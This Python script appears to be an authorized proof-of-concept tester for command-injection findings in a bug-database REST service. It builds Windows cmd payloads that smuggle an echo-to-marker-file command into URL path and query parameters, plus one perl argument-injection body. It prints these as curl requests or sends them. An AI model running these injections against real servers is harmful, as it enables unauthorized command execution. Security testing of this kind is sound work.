#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass


DEFAULT_BASE_URL = "http://localhost:8080/bugdb"


@dataclass(frozen=True)
class PocCase:
    case_id: str
    title: str
    trace_location: str
    method: str
    path_parts: tuple[str, ...]
    query: tuple[tuple[str, str], ...] = ()
    json_body: dict[str, str] | None = None
    marker_file: str = ""
    server_verification: str = ""
    notes: str = ""


def windows_unquoted_marker(case_id: str) -> str:
    marker = f"%TEMP%\\dsa_samrest_{case_id}.txt"
    return f"x & echo DSA_POC_{case_id} > {marker} & rem"


def windows_quoted_marker(case_id: str) -> str:
    marker = f"%TEMP%\\dsa_samrest_{case_id}.txt"
    return f'x" & echo DSA_POC_{case_id} > {marker} & rem "'


def build_cases() -> tuple[PocCase, ...]:
    workspace_payload = windows_quoted_marker("workspace")
    clearcase_payload = windows_unquoted_marker("clearcase")
    svn_old_payload = windows_unquoted_marker("svn_old")
    svn_sam_payload = windows_unquoted_marker("svn_sam")

    return (
        PocCase(
            case_id="workspace",
            title="Path variable owner reaches cmd /c workspace validation command",
            trace_location="RestController.java:583",
            method="GET",
            path_parts=(
                "workspace",
                "owner",
                workspace_payload,
                "fixby",
                "17.0",
                "wsname",
                "demo",
                "bugnumber",
                "12345678",
            ),
            marker_file=r"%TEMP%\dsa_samrest_workspace.txt",
            server_verification=r'type "%TEMP%\dsa_samrest_workspace.txt"',
            notes="Exercises getWorkspaceValidated. The owner path variable closes the quoted /u argument and appends a benign echo command.",
        ),
        PocCase(
            case_id="clearcase",
            title="Path variable pbname reaches cmd /c clearcase command",
            trace_location="RestController.java:622 and RestController.java:648",
            method="GET",
            path_parts=("clearcase", "pb", clearcase_payload),
            marker_file=r"%TEMP%\dsa_samrest_clearcase.txt",
            server_verification=r'type "%TEMP%\dsa_samrest_clearcase.txt"',
            notes="Exercises getFileListValidated. Depending on branchOk, this endpoint can also reach the second sink at line 648.",
        ),
        PocCase(
            case_id="svn_old",
            title="Path variable fixby reaches cmd /c SVN command",
            trace_location="RestController.java:734",
            method="GET",
            path_parts=("svn_old", "fixby", svn_old_payload),
            query=(("branch", "example.com/repo"),),
            marker_file=r"%TEMP%\dsa_samrest_svn_old.txt",
            server_verification=r'type "%TEMP%\dsa_samrest_svn_old.txt"',
            notes="Exercises getSVNFileListValidated. The branch value is kept URL-valid; the unquoted fixby value carries the marker command.",
        ),
        PocCase(
            case_id="svn_sam",
            title="Request parameter fixby reaches cmd /c SAM SVN command",
            trace_location="RestController.java:852",
            method="GET",
            path_parts=("svn",),
            query=(
                ("branch", "https://example.com/repo"),
                ("fixby", svn_sam_payload),
            ),
            marker_file=r"%TEMP%\dsa_samrest_svn_sam.txt",
            server_verification=r'type "%TEMP%\dsa_samrest_svn_sam.txt"',
            notes="Exercises getSVNFileListValidatedForSAM. The URL validation applies to branch, so fixby is used for the harmless marker command.",
        ),
        PocCase(
            case_id="orahubmerge-argument-injection",
            title="Request body sourceBranch reaches perl process arguments",
            trace_location="RestController.java:1210",
            method="POST",
            path_parts=("orahubmerge", ""),
            json_body={
                "sourceBranch": 'feature/test" --help "',
                "requestid": "DSA-POC",
            },
            marker_file="n/a",
            server_verification="Review server logs for the printed command and confirm sourceBranch changed perl script arguments.",
            notes=(
                "This case is argument injection into Runtime.exec(String), not a cmd /c shell marker-file PoC. "
                "Do not classify it as OS command execution without confirming the called perl script interprets the injected argument dangerously."
            ),
        ),
    )


def build_url(base_url: str, case: PocCase) -> str:
    base = base_url.rstrip("/")
    encoded_parts = [urllib.parse.quote(part, safe="") for part in case.path_parts]
    url = f"{base}/{'/'.join(encoded_parts)}"
    if case.query:
        url = f"{url}?{urllib.parse.urlencode(case.query)}"
    return url


def curl_command(base_url: str, case: PocCase) -> str:
    url = build_url(base_url, case)
    if case.method == "POST":
        body = json.dumps(case.json_body or {}, separators=(",", ":"))
        return (
            "curl -i -X POST "
            "-H 'Content-Type: application/json' "
            f"--data '{body}' "
            f"'{url}'"
        )
    return f"curl -i '{url}'"


def execute_case(base_url: str, case: PocCase, timeout: int) -> tuple[int | None, str]:
    url = build_url(base_url, case)
    headers = {}
    data = None
    if case.method == "POST":
        headers["Content-Type"] = "application/json"
        data = json.dumps(case.json_body or {}).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers=headers, method=case.method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(1000).decode("utf-8", errors="replace")
            return response.status, body
    except urllib.error.HTTPError as exc:
        body = exc.read(1000).decode("utf-8", errors="replace")
        return exc.code, body
    except urllib.error.URLError as exc:
        return None, str(exc)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Generate or run safe PoC requests for SAMRESTServices command-injection findings. "
            "Dry-run is the default."
        )
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="SAM REST base URL, for example http://host:port/bugdb")
    parser.add_argument("--case", choices=[case.case_id for case in build_cases()], help="run or print only one case")
    parser.add_argument("--execute", action="store_true", help="send HTTP requests instead of printing them")
    parser.add_argument(
        "--i-understand-authorized-test",
        action="store_true",
        help="required with --execute; confirms this is an authorized dev/test target",
    )
    parser.add_argument("--timeout", type=int, default=20, help="HTTP timeout in seconds")
    args = parser.parse_args(argv)

    if args.execute and not args.i_understand_authorized_test:
        print("--execute requires --i-understand-authorized-test", file=sys.stderr)
        return 2

    cases = build_cases()
    if args.case:
        cases = tuple(case for case in cases if case.case_id == args.case)

    for case in cases:
        print(f"\n## {case.case_id}: {case.title}")
        print(f"Trace: {case.trace_location}")
        print(f"Notes: {case.notes}")
        print(f"Marker file: {case.marker_file}")
        print(f"Server verification: {case.server_verification}")
        print("Request:")
        print(curl_command(args.base_url, case))
        if args.execute:
            status, body = execute_case(args.base_url, case, timeout=args.timeout)
            print(f"HTTP status: {status}")
            if body:
                print("Response preview:")
                print(body[:1000])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
